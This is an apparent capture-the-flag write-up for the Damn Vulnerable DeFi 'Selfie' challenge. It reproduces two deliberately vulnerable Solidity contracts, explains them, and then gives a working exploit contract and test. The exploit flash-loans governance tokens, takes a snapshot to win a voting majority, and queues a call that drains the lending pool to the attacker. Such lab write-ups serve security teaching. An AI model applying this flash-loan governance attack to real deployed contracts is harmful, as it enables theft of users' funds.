@@ -1,0 +1,279 @@
+#+AUTHOR: Francesco Cannarozzo
+* Selfie
+  ../selfie
+** Statement
+   A lending pool is supported by a governance system. Starting with an epty balance, we are tasked with
+   taking all 1.5 million tokens in the pool.
+** Files
+*** SimpleGovernance.sol
+**** Code
+     #+BEGIN_SRC solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../DamnValuableTokenSnapshot.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+
+/**
+ * @title SimpleGovernance
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract SimpleGovernance {
+
+    using Address for address;
+    
+    struct GovernanceAction {
+        address receiver;
+        bytes data;
+        uint256 weiAmount;
+        uint256 proposedAt;
+        uint256 executedAt;
+    }
+    
+    DamnValuableTokenSnapshot public governanceToken;
+
+    mapping(uint256 => GovernanceAction) public actions;
+    uint256 private actionCounter;
+    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;
+
+    event ActionQueued(uint256 actionId, address indexed caller);
+    event ActionExecuted(uint256 actionId, address indexed caller);
+
+    constructor(address governanceTokenAddress) {
+        require(governanceTokenAddress != address(0), "Governance token cannot be zero address");
+        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
+        actionCounter = 1;
+    }
+    
+    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
+        require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
+        require(receiver != address(this), "Cannot queue actions that affect Governance");
+
+        uint256 actionId = actionCounter;
+
+        GovernanceAction storage actionToQueue = actions[actionId];
+        actionToQueue.receiver = receiver;
+        actionToQueue.weiAmount = weiAmount;
+        actionToQueue.data = data;
+        actionToQueue.proposedAt = block.timestamp;
+
+        actionCounter++;
+
+        emit ActionQueued(actionId, msg.sender);
+        return actionId;
+    }
+
+    function executeAction(uint256 actionId) external payable {
+        require(_canBeExecuted(actionId), "Cannot execute this action");
+        
+        GovernanceAction storage actionToExecute = actions[actionId];
+        actionToExecute.executedAt = block.timestamp;
+
+        actionToExecute.receiver.functionCallWithValue(
+            actionToExecute.data,
+            actionToExecute.weiAmount
+        );
+
+        emit ActionExecuted(actionId, msg.sender);
+    }
+
+    function getActionDelay() public view returns (uint256) {
+        return ACTION_DELAY_IN_SECONDS;
+    }
+
+    /**
+     * @dev an action can only be executed if:
+     * 1) it's never been executed before and
+     * 2) enough time has passed since it was first proposed
+     */
+    function _canBeExecuted(uint256 actionId) private view returns (bool) {
+        GovernanceAction memory actionToExecute = actions[actionId];
+        return (
+            actionToExecute.executedAt == 0 &&
+            (block.timestamp - actionToExecute.proposedAt >= ACTION_DELAY_IN_SECONDS)
+        );
+    }
+    
+    function _hasEnoughVotes(address account) private view returns (bool) {
+        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
+        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
+        return balance > halfTotalSupply;
+    }
+}
+
+     #+END_SRC
+
+**** BreakDown
+***** State
+      the contract maintains a *DamnValuableTokenSnapshot* reference as *governanceToken*,
+      set via the constructor via its address, which is required to be different from the zero address.
+      a struct *GovernanceAction*, used for queuing governance actions, is declared, as well as
+      a mapping of uints into governanceActions called *actions*. Lastly, we count actions through
+      *actionCounter*
+***** queueAction 
+      the function takes three inputs: a *receiver* address, some bytes of *data*, and an uint *weiAmount*.
+      First of all, the function requires *msg.sender* to have enough votes, through the private *_hasEnoughVotes()*.
+      Then, receiver is required to be different than the governance contract.
+      Once these requirements are met, *actionId* is set to be equal to *actionCounter*,
+      then a new *GovernanceAction* is set up, filling its fields in with function input,
+      and stored at *actions[actionId]*.
+      Finally, *actionCounter* is incremented, and an *ActionQueued* event is emitted.
+***** executeAction
+      taking as argument the uint *actionId*, checks through the private *_canBeExecuted()* function
+      if the action can indeed be executed. If the requirement is met, *functionCallWithValue()* is used
+      to call the function specified in the action's data, onto *receiver*.
+      Finally, an *ActionExecuted* event is emitted.
+***** _canBeExecuted
+      taking in an uint *actionId*, *action[actionId]* is first loaded into memory;
+      the function then returns true only if the action has not been executed, and if the delay
+      between current block timestamp and *actionToExecute.proposedAt* is longer than the stated minimum delay.
+***** _hasEnoughVotes
+      taking in an address *account*, the account's *governanceToken* balance at the latest snapshot
+      is compared to the total supply at the same moment: if that balance amounts to more than half
+      of total supply, true is returned.
+*** SelfiePool.sol
+**** Code
+     #+BEGIN_SRC solidity
+     // SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+import "./SimpleGovernance.sol";
+
+/**
+ * @title SelfiePool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract SelfiePool is ReentrancyGuard {
+
+    using Address for address;
+
+    ERC20Snapshot public token;
+    SimpleGovernance public governance;
+
+    event FundsDrained(address indexed receiver, uint256 amount);
+
+    modifier onlyGovernance() {
+        require(msg.sender == address(governance), "Only governance can execute this action");
+        _;
+    }
+
+    constructor(address tokenAddress, address governanceAddress) {
+        token = ERC20Snapshot(tokenAddress);
+        governance = SimpleGovernance(governanceAddress);
+    }
+
+    function flashLoan(uint256 borrowAmount) external nonReentrant {
+        uint256 balanceBefore = token.balanceOf(address(this));
+        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
+        
+        token.transfer(msg.sender, borrowAmount);        
+        
+        require(msg.sender.isContract(), "Sender must be a deployed contract");
+        msg.sender.functionCall(
+            abi.encodeWithSignature(
+                "receiveTokens(address,uint256)",
+                address(token),
+                borrowAmount
+            )
+        );
+        
+        uint256 balanceAfter = token.balanceOf(address(this));
+
+        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
+    }
+
+    function drainAllFunds(address receiver) external onlyGovernance {
+        uint256 amount = token.balanceOf(address(this));
+        token.transfer(receiver, amount);
+        
+        emit FundsDrained(receiver, amount);
+    }
+}
+     #+END_SRC
+      
+**** Breakdown
+***** State
+      the contract merely maintains a reference to a *ERC20Snapshot* token, and to a *SimpleGovernance* contract,
+      assigned via the constructor.
+***** flashLoan
+      regular flashLoan behavior applies here, with the peculiarity that the address requesting the loan
+      _MUST_ be a contract address.
+***** drainAllFunds
+      that's what we're aiming for. Literally drains all funds and transfers them to the receiver.
+      However, only governance can call this method.
+** Exploit
+   Governance's reliance on snapshot for the extablishment of a vote majority is what we're going to be targeting:
+
+   attacker will thus FlashLoan enough tokens to have enough votes, immediatly take a snapshot, queue the desired action with
+   the malicious payload, and finally return the flashLoan. Finally, after 2 days evm time, the attack can be completed.
+*** Code
+    #+BEGIN_SRC solidity
+    pragma solidity ^0.8.0;
+
+import '../../selfie/SelfiePool.sol';
+import '../../selfie/SimpleGovernance.sol';
+import "../../DamnValuableTokenSnapshot.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+
+
+contract SelfieAttacker {
+
+    using Address for address;
+
+    address attacker;
+    SelfiePool pool;
+    SimpleGovernance governance;
+    DamnValuableTokenSnapshot token;
+    uint256 actionId;
+    
+
+    constructor(address _poolAddress, address _governanceAddress, address _tokenAddress, address _attackerAddress) {
+        pool = SelfiePool(_poolAddress);
+        governance = SimpleGovernance(_governanceAddress);
+        token = DamnValuableTokenSnapshot(_tokenAddress);
+        attacker = _attackerAddress;
+        
+    }
+
+    function setUp(uint256 _amount) external {
+        pool.flashLoan(_amount);
+
+    }
+
+function attack() external{
+    governance.executeAction(actionId);
+}
+
+    function receiveTokens(address _address, uint256  _amount) external{
+        token = DamnValuableTokenSnapshot(_address);
+        token.snapshot();
+        bytes memory requestData = abi.encodeWithSignature("drainAllFunds(address)",
+        attacker);
+        actionId = governance.queueAction(address(pool), requestData, 0);
+                token.transfer(address(pool), _amount);
+
+    }
+
+
+}
+
+    #+END_SRC
+
+Attacker code will be called as follows:
+
+#+BEGIN_SRC javascript
+    it('Exploit', async function () {
+        
+        const attackerFactory = await ethers.getContractFactory('SelfieAttacker', deployer);
+
+        const selfieAttacker = await attackerFactory.deploy(this.pool.address, this.governance.address, this.token.address, attacker.address);
+        await selfieAttacker.setUp(TOKENS_IN_POOL);
+        await ethers.provider.send("evm_increaseTime", [60*60*24*2]);
+        await selfieAttacker.attack()
+    });
+#+END_SRC
+
+   
